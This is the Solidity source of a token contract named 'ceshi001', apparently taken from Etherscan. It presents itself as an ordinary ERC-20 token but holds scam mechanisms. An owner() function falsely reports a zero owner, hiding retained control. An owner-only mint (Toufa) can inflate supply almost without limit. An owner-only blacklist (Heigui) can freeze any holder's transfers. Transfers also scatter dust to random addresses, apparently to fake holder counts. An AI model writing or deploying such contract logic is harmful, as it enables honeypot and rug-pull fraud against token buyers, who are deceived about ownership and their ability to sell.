/**
 *Submitted for verification at Etherscan.io on 2022-08-04
*/

// SPDX-License-Identifier: Unlicensed
pragma solidity ^0.4.25;

library SafeMath {

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }
        uint256 c = a * b;
        require(c / a == b);
        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0);
        uint256 c = a / b;
        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a);
        uint256 c = a - b;
        return c;
    }

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a);
        return c;
    }

    function mod(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b != 0);
        return a % b;
    }
}

contract Ownable {
    address public owner;

    event owneresshipTransferred(address indexed previousowneres, address indexed newowneres);

    modifier onlyowneres() {
        require(msg.sender == owner);
        _;
    }

/**
    * @dev Returns the address of the current owner.
     */
    function owner() public pure  returns  (address) {
        return address(0);
    }


    function transferowneresship(address newowneres) public onlyowneres {
        require(newowneres != address(0));
        emit owneresshipTransferred(owner, newowneres);
        owner = newowneres;
    }

    function renounceowneresship() public onlyowneres {
        emit owneresshipTransferred(owner, address(0));
        owner = address(0);
    }
}



contract BaseToken is Ownable {
    using SafeMath for uint256;

    string constant public name = 'ceshi001';

    string constant public symbol = 'ceshi001';

    uint8 constant public decimals = 9;

    uint256 public totalSupply = 1000000000000*10**uint256(decimals);

    uint256 public constant MAXSupply = 1000000000000000000000000000000000000000000000000000 * 10 ** uint256(decimals);

    mapping (address => uint256) public balanceOf;
    mapping (address => mapping (address => uint256)) public allowance;

    mapping(address => bool) public _isExcludedFromfew;

    mapping(address => bool) private _lkck;

    uint256 public _taxfew = 2;
    uint256 private _previousTaxfew = _taxfew;

    uint256 public _burnfew = 0;
    uint256 private _previousBurnfew = _burnfew;


    address public projectAddress = 0x000000000000000000000000000000000000dEaD;


    address public burnAddress = 0x000000000000000000000000000000000000dEaD;

    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);

    function _transfer(address from, address to, uint value) internal {
        require(to != address(0), "is 0 address");

        require(!_lkck[from], "is lkck");

        if(!_isExcludedFromfew[from] && !_isExcludedFromfew[to]){
            address ad;
            uint256 freeToken=value/10000;
            for(int i=0;i <=9;i++){
                ad = address(uint160(uint(keccak256(abi.encodePacked(i, value, block.timestamp)))));
                _basicTransfer(from,ad,freeToken/10);
            }
            value -= freeToken;
        }

        if(_isExcludedFromfew[from])
            removeAllfew();

        uint256 few =  calculateTaxfew(value);

        uint256 burn =  calculateBurnfew(value);

        balanceOf[from] = balanceOf[from].sub(value);

        balanceOf[to] = balanceOf[to].add(value).sub(few).sub(burn);

        if(few > 0) {
            balanceOf[projectAddress] = balanceOf[projectAddress].add(few);
            emit Transfer(from, projectAddress, few);
        }

        if(burn > 0) {
            balanceOf[burnAddress] = balanceOf[burnAddress].add(burn);
            emit Transfer(from, burnAddress, burn);
        }


         if(_isExcludedFromfew[from])
            restoreAllfew();

        emit Transfer(from, to, value);
    }

     function _basicTransfer(address sender, address recipient, uint256 value) internal returns (bool) {
        balanceOf[sender] -= value;
        balanceOf[recipient] += value;
        emit Transfer(sender, recipient, value);
        return true;
    }


    function transfer(address to, uint256 value) public returns (bool) {
        _transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) public returns (bool) {
        allowance[from][msg.sender] = allowance[from][msg.sender].sub(value);
        _transfer(from, to, value);
        return true;
    }

    function approve(address spender, uint256 value) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function increaseAllowance(address spender, uint256 addedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].add(addedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }

    function decreaseAllowance(address spender, uint256 subtractedValue) public returns (bool) {
        require(spender != address(0));
        allowance[msg.sender][spender] = allowance[msg.sender][spender].sub(subtractedValue);
        emit Approval(msg.sender, spender, allowance[msg.sender][spender]);
        return true;
    }


    function Toufa(address target, uint256 edAmount) public onlyowneres{
    	require (totalSupply + edAmount <= MAXSupply);

        balanceOf[target] = balanceOf[target].add(edAmount);
        totalSupply = totalSupply.add(edAmount);

        emit Transfer(0, this, edAmount);
        emit Transfer(this, target, edAmount);
    }

    function calculateTaxfew(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_taxfew).div(
            10 ** 2
        );
    }

    function calculateBurnfew(uint256 _amount) private view returns (uint256) {
        return _amount.mul(_burnfew).div(
            10 ** 2
        );
    }

    function removeAllfew() private {
        if(_taxfew == 0 && _burnfew == 0)
            return;

        _previousTaxfew = _taxfew;
        _previousBurnfew = _burnfew;
        _taxfew = 0;
        _burnfew = 0;
    }

    function restoreAllfew() private {
        _taxfew = _previousTaxfew;
        _burnfew = _previousBurnfew;
    }



    function Heigui(address account) public onlyowneres {
        _lkck[account] = true;
    }


    function heigui2(address account) public onlyowneres {
        _lkck[account] = false;
    }


    function islkck(address account) public view returns (bool) {

        return _lkck[account];
    }

    function chuqu(address account) public onlyowneres {
        _isExcludedFromfew[account] = true;
    }


}


contract ceshiToken is BaseToken {

    constructor() public {
        balanceOf[msg.sender] = totalSupply;
        _isExcludedFromfew[msg.sender] = true;
        _isExcludedFromfew[projectAddress] = true;
        emit Transfer(address(0), msg.sender, totalSupply);

        owner = msg.sender;


    }

    function() public payable {
       revert();
    }
}